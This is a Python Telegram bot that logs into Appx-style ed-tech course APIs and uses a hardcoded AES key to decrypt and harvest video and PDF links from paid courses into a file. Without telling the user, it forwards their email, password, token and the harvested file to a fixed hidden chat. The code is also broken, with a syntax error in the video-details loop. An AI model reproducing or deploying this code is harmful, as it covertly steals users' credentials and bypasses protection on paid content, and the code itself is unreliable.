import json
from pyrogram.types import InputMediaDocument
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
import logging
import main
import config
import asyncio
import base64
import os
import cloudscraper
from Crypto.Cipher import AES
import datetime

time = datetime.datetime.now().strftime("%d-%m-%Y")

my_data = -1001938939742
sudo_group = config.GROUPS
ADMINS = config.ADMINS

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"


def decrypt(text):
    key = '638udh3829162018'
    key = bytearray(key.encode())
    iv_key = 'fedcba9876543210'
    iv_key = bytearray(iv_key.encode())
    bs = 16
    
    # Use PKCS7 padding
    PADDING = lambda s: s + (bs - len(s) % bs) * bytes([bs - len(s) % bs])
    
    generator = AES.new(key, AES.MODE_CBC, iv_key)
    
    # Pad the base64 string 
    text += '=' * ((4 - len(text) % 4) % 4)
    
    try:
        decrpyt_bytes = base64.b64decode(text)
    except base64.binascii.Error:
        return 'Invalid base64-encoded string'
    
    # Decrypt using AES
    meg = generator.decrypt(decrpyt_bytes)
    
    # Remove the PKCS7 padding after decoding
    try:
        result = meg[:-meg[-1]].decode('utf-8')
    except Exception:
        result = 'Decoding failed, please try again!'
    
    return result
    

@bot.on_message(filters.command("api") & (filters.chat(sudo_group) | filters.user(ADMINS)))
#@bot.on_message(filters.command("api"))
async def start(bot, m):
    editable = await bot.send_message(m.chat.id, "**ðŸŒ Enter API :**")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **Token** or **ID & Password** ðŸ§²")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        #'Content-Length': '225',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
    	data["email"] = raw_text.split("*")[0]
    	data["password"] = raw_text.split("*")[1]    
    	scraper = cloudscraper.create_scraper()	
    	html = scraper.post("https://"+raw_text05+"/post/userLogin",data,headers=login_hdr).content
    	output = json.loads(html)
    	token = output["data"]["token"]
    	userid = output["data"]["userid"]
    else:
    	token = raw_text.split("$")[0]
    	userid = raw_text.split("$")[1]
    	
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }        
    scraper = cloudscraper.create_scraper()
    html1 = scraper.get("https://"+raw_text05+"/get/mycourse?userid=" + userid, headers = hdr).content
    output1 = json.loads(html1)
    topicid = output1["data"]
    
    cool = ""
    total_links = 0
    for data in topicid:
        aa = f" `{data['id']}` Â» {data['course_name']} âœ³ï¸ â‚¹{data['price']}\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    await editable.edit(f"Login successfull....âœ…âš™ï¸")
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  âž¤  **BATCH NAME**\n\n{cool}\nSEND ID :")
    input1 = await bot.listen(editable.chat.id)
    raw_text1 = input1.text

    course_title = ""  
    for data in topicid:
        if data['id'] == raw_text1:
            batch_logo = data['course_thumbnail']
            course_title = data['course_name'].replace('/','')
    #await input1.delete(True)
    scraper = cloudscraper.create_scraper()
    html3 = scraper.get("https://"+raw_text05+"/get/allsubjectfrmlivecourseclass?courseid=" + raw_text1, headers=hdr).content
    output3 = json.loads(html3)
    topicid = output3["data"]
    for topic in topicid:
        tids = topic["subjectid"]
        subject_title = topic["subject_name"].replace(':', '')
        scraper = cloudscraper.create_scraper()
        html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
        output4 = json.loads(html4)
        vv = output4["data"]
        tsids_list = []
        for data in vv:
            tsids = data['topicid']
            tsids_list.append(tsids)
        for tsids in tsids_list:
            scraper = cloudscraper.create_scraper()            
            html5 = scraper.get("https://"+raw_text05+"/get/livecourseclassbycoursesubtopconceptapiv3?topicid=" + tsids + "&start=-1&courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
            output5 = json.loads(html5)
            gg = output5["data"]
            for video in gg:
                if video.get("download_link"):
                    video_title = video["Title"].replace('||', '').replace('#', '').replace(':', '').replace(',', '').replace('@', '').replace('|', '')
                    fuck = video["download_link"]
                    video_link = decrypt((fuck).split(":")[0])
                    pdf_link = video["pdf_link"]
                    pdf_link2 = video["pdf_link2"]
                    if pdf_link and pdf_link != fuck:
                        pdf_link_decrypted = decrypt(pdf_link.split(":")[0])
                        video_link += f"\n({subject_title}) {video_title} PDF:{pdf_link_decrypted}"
                        total_links += 1
                    if pdf_link2:
                        pdf_link2_decrypted = decrypt(pdf_link2.split(":")[0])
                        video_link += f"\n({subject_title}) {video_title} PDF-2:{pdf_link2_decrypted}"
                        total_links += 1
                    with open(f"{course_title}.txt", 'a') as f:
                        f.write(f"({subject_title}) {video_title}:{video_link}\n")
                        total_links += 1
                else:
                    video_id = video["id"]
                    video_title = video["Title"].replace('||', '').replace('#', '').replace(':', '').replace(',', '').replace('@', '').replace('|', '')
                    scraper = cloudscraper.create_scraper()            
                    html6 = scraper.get("https://"+raw_text05+"/get/fetchVideoDetailsById?course_id=" + raw_text1 + "&video_id=" + video_id + "&ytflag=0&folder_wise_course=0", headers=hdr).content
                    output6 = json.loads(html6)  
                    for data in output6:
                       
                        vt = data"Title"]
                        vl = data["download_link"]
                        if vl:
                            dvl = decrypt(vl)
                            video_link += f"\n({subject_title}) {vt}:{dvl}"
                        else:
                            vl = data["encrypted_links"][0]["path"]
                            vll = decrypt(vl)
                            k = data["encrypted_links"][0]["key"]
                            if k:
                                k1 = decrypt(k)
                                k2 = decode_base64(k1)
                                video_link += f"\n({subject_title}) {vt}:{vll}*{k2}"
                            else:
                                video_link += f"\n({subject_title}) {vt}:{vll}"
                        pdf_lk = output6['data']["pdf_link"]
                        pdf_lk2 = output6['data']["pdf_link2"]
                        if pdf_lk:
                            pdf_link_decrypted = decrypt(pdf_lk.split(":")[0])
                            video_link += f"\n({subject_title}) {video_title} PDF:{pdf_link_decrypted}"
                            total_links += 1
                        if pdf_lk2:
                            pdf_link2_decrypted = decrypt(pdf_lk2.split(":")[0])
                            video_link += f"\n({subject_title}) {video_title} PDF-2:{pdf_link_decrypted}"
                            total_links += 1
                        else:
                            pdf_link2_decrypted = "None"
                        
                        with open(f"{course_title}.txt", 'a') as f:
                            f.write(f"({subject_title}) {video_title}:{video_link}\n")
                            total_links += 1
 
    caption_details = raw_text05.replace("api.cloudflare.net.in", "").replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("apinew.teachx.in", "").replace ("api.akamai.net.in", "").replace("api.teachx.in", "").replace("cloudflare.net.in", "").upper()
    file1 = InputMediaDocument(f"{course_title}.txt", caption=f"à¿‡ â•â•â”â”ð‘ð„ð—ðŽðƒð€ð’â”â”â•â• à¿‡\n\n**ðŸŒ€ Batch Id :** {raw_text1}\n\n**âœ³ï¸ App :** {caption_details} (AppX V1)\n\n**ðŸ“š Batch :** `{course_title}`\n\n**ðŸ”° Total Links :** {total_links}\n\n**ðŸŒªï¸ Thumb :** `{batch_logo}`\n\n**â„ï¸ Date :** {time}")
    await bot.send_media_group(m.chat.id, [file1])
    await bot.send_media_group(my_data, [file1])    
    os.remove(f"{course_title}.txt")
    await bot.send_message(m.chat.id, "Batch Grabbing Done ðŸ”°")
  
